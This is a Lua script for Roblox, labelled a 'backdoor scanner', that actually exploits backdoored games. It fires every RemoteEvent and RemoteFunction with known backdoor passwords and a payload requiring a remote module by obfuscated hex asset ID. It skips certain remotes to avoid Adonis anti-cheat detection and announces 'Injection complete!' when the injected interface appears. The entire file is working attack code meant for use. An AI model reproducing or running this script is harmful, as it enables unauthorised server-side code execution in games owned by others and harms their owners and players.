--//Backdoor scanner 0.0

local dateTimeNow = DateTime.now
local tableFind = table.find
local taskSpawn = task.spawn
local taskWait = task.wait
local stringRep = string.rep
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local JointsService = game:GetService("JointsService")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = game:GetService("Players").LocalPlayer

local requireScript = ('require(tonumber("76ebeac43c19", 16))')

local alternativeSS = {
	run = { [1] = "5#lGIERKWEF" },
	emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
	helpme = { [1] = "helpme" },
	pickett = { [1] = "cGlja2V0dA==" },
}

local function attached(possibleWait)
	local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
	if possibleWait then
		local start = dateTimeNow().UnixTimestampMillis
		local timeout = possibleWait * 1000
		while PlayerGui and not PlayerGui:FindFirstChild("Injected!") and (timeout > (dateTimeNow().UnixTimestampMillis - start)) do
			taskWait()
		end
	end
	return PlayerGui and PlayerGui:FindFirstChild("Injected!")
end

local function validRemote(rm)
	local Parent = rm.Parent
	if getgenv().blacklisted then
		if tableFind(getgenv().blacklisted, rm:GetFullName()) then
			return false
		end
	end
	if Parent then
		if Parent == JointsService then return false end
		if ((Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
			(rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage)) then --//avoid adonis detection
			return false
		end
	end
	if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
	return true
end

local function notify(text)
	StarterGui:SetCore("SendNotification", {
		Title = "Backdoor Scanner",
		Duration = 2,
		Text = text
	})
end

local function emmaBackdoor(rm)
	local Parent = rm.Parent
	return rm.Name == "emma" and Parent and Parent.Name == "mynameemma" and Parent.Parent == ReplicatedStorage
end

local function runBackdoor(rm)
	local Parent = rm.Parent
	return rm.Name == "Run" and Parent and Parent:FindFirstChild("Pages") and Parent:FindFirstChild("R6") and Parent:FindFirstChild("Version") and Parent:FindFirstChild("Title")
end

local function scanGame()
	notify("Scanning For Backdoors...")
	local DescendantsList = game:GetDescendants()
	for i = 1, #DescendantsList do
		if attached() then break end
		local remote = DescendantsList[i]
		if not validRemote(remote) then continue end
		if remote.ClassName ~= "RemoteEvent" then continue end
		if emmaBackdoor(remote) then
			remote:FireServer(unpack(alternativeSS.emma), requireScript)
		elseif runBackdoor(remote) then
			remote:FireServer(unpack(alternativeSS.run), requireScript)
		else
			remote:FireServer(unpack(alternativeSS.helpme), requireScript)
			remote:FireServer(unpack(alternativeSS.pickett), requireScript)
			remote:FireServer(requireScript)
		end
	end
	for i = 1, #DescendantsList do
		if attached() then break end
		local remote = DescendantsList[i]
		if not validRemote(remote) then continue end
		if remote.ClassName ~= "RemoteFunction" then continue end
		local waiting = true
		taskSpawn(function()
			pcall(function()
				remote:InvokeServer(requireScript)
			end)
			waiting = false
		end)
		local start = dateTimeNow().UnixTimestampMillis
		while waiting and (1000 > (dateTimeNow().UnixTimestampMillis - start)) do
			taskWait()
		end
	end
end

local function Main()
	scanGame()
	if not attached(3.5) then
		notify("The game is not backdoored.")
	else
		notify("The game is backdoored, Injection complete!")
	end
end

if game:IsLoaded() then
	pcall(Main)
end
